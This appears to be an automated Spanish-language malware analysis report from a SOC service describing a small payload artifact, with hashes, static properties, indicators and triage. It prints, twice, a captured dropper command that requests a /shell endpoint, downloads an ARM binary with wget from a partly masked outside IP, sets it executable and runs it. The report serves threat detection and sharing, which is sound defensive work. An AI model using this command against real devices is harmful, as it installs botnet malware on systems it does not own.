# 🧬 Payload Analysis

`bde4d32266e74f7b295e9906a88ae0cad9d9a6d4c762e5d7cfd344a3baa30acb`

## 📌 Resumen

Artefacto clasificado como **Payload** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Cambio de permisos, Limpieza. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Payload`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:11+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `bde4d32266e74f7b295e9906a88ae0cad9d9a6d4c762e5d7cfd344a3baa30acb`
- **SHA1:** `c264409c291a9946601fa6e836fa6f5e477e98f3`
- **MD5:** `3f16abd181ecc72b0edd2aa2cd6c2b98`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 513 B |
| Entropía | 5.35 |
| Strings | 8 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /shell?cd+/tmp;rm+main_arm+main_arm7+arm7+arm;wget+http:/\/201.51.13.XXX/main_arm7;chmod+777+main_arm7;./main_arm7+je
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 190.179.168.XXX | static_analysis |
| ip | 201.51.13.XXX | static_analysis |
| hash | bde4d32266e74f7b295e9906a88ae0cad9d9a6d4c762e5d7cfd344a3baa30acb | static_analysis |
| command | GET /shell?cd+/tmp;rm+main_arm+main_arm7+arm7+arm;wget+http:/\/201.51.13.XXX/main_arm7;chmod+777+main_arm7;./main_arm7+je | strings |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
